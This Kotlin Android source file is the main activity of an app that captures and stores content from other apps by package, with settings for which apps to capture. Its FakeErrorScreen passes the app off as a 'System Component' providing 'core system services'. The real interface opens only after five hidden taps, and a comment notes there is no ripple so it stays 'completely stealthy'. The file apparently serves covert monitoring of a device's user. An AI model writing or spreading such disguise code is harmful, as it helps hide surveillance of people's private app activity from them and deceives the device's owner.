package com.example.memo

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.ui.Alignment
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavType
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import androidx.navigation.navArgument
import com.example.memo.ui.MainViewModel
import com.example.memo.ui.screens.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MemoApp()
                }
            }
        }
    }
}

@Composable
fun MemoApp() {
    var isUnlocked by remember { mutableStateOf(false) }

    if (!isUnlocked) {
        FakeErrorScreen(onUnlock = { isUnlocked = true })
    } else {
        val navController = rememberNavController()
        val viewModel: MainViewModel = viewModel()

        NavHost(navController = navController, startDestination = "home") {

        // --- Home Screen ---
        composable("home") {
            val apps by viewModel.distinctApps.collectAsState()
            HomeScreen(
                apps = apps,
                onAppClick = { packageName, appName ->
                    viewModel.loadEntriesForApp(packageName)
                    navController.navigate("folder/${packageName}/${appName}")
                },
                onSearchClick = { navController.navigate("search") },
                onSettingsClick = { navController.navigate("settings") }
            )
        }

        // --- Folder Screen ---
        composable(
            route = "folder/{packageName}/{appName}",
            arguments = listOf(
                navArgument("packageName") { type = NavType.StringType },
                navArgument("appName") { type = NavType.StringType }
            )
        ) { backStackEntry ->
            val appName = backStackEntry.arguments?.getString("appName") ?: "Unknown App"
            val packageName = backStackEntry.arguments?.getString("packageName") ?: ""
            val entries by viewModel.currentAppEntries.collectAsState()

            FolderScreen(
                appName = appName,
                entries = entries,
                onBackClick = { navController.popBackStack() },
                onEntryClick = { entryId ->
                    navController.navigate("detail/${entryId}")
                }
            )
        }

        // --- Entry Detail Screen ---
        composable(
            route = "detail/{entryId}",
            arguments = listOf(navArgument("entryId") { type = NavType.IntType })
        ) { backStackEntry ->
            val entryId = backStackEntry.arguments?.getInt("entryId") ?: -1
            val entries by viewModel.currentAppEntries.collectAsState()
            val entry = entries.find { it.id == entryId }

            EntryDetailScreen(
                entry = entry,
                onBackClick = { navController.popBackStack() },
                onDeleteClick = { id -> viewModel.deleteEntry(id) }
            )
        }

        // --- Search Screen ---
        composable("search") {
            val query by viewModel.searchQuery.collectAsState()
            val results by viewModel.searchResults.collectAsState()

            SearchScreen(
                query = query,
                results = results,
                onQueryChange = { viewModel.setSearchQuery(it) },
                onEntryClick = { entry ->
                    viewModel.loadEntriesForApp(entry.packageName)
                    navController.navigate("detail/${entry.id}")
                },
                onBackClick = {
                    viewModel.setSearchQuery("")
                    navController.popBackStack()
                }
            )
        }

        // --- Settings Screen ---
        composable("settings") {
            val isCapturing by viewModel.isCapturing.collectAsState()
            val includedApps by viewModel.includedApps.collectAsState()
            val installedApps by viewModel.installedApps.collectAsState()
            val autoDeleteDays by viewModel.autoDeleteDays.collectAsState()

            SettingsScreen(
                isCapturing = isCapturing,
                includedApps = includedApps,
                installedApps = installedApps,
                autoDeleteDays = autoDeleteDays,
                onBackClick = { navController.popBackStack() },
                onCapturingToggle = { viewModel.setCapturingEnabled(it) },
                onIncludeApp = { viewModel.addIncludedApp(it) },
                onExcludeApp = { viewModel.removeIncludedApp(it) },
                onAutoDeleteChanged = { viewModel.setAutoDeleteDays(it) },
                onClearAllData = { viewModel.clearAllData() }
            )
        }
        }
    }
}

@Composable
fun FakeErrorScreen(onUnlock: () -> Unit) {
    var tapCount by remember { mutableStateOf(0) }
    val interactionSource = remember { MutableInteractionSource() }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .clickable(
                interactionSource = interactionSource,
                indication = null // No ripple effect to be completely stealthy
            ) {
                tapCount++
                if (tapCount >= 5) {
                    onUnlock()
                }
            },
        contentAlignment = Alignment.Center
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(32.dp)) {
            Icon(
                Icons.Default.Info,
                contentDescription = null,
                modifier = Modifier.size(48.dp),
                tint = MaterialTheme.colorScheme.onSurfaceVariant
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text(
                "System Component",
                style = MaterialTheme.typography.titleMedium
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "This app is working normally in the background to provide core system services.",
                style = MaterialTheme.typography.bodyMedium,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
    }
}
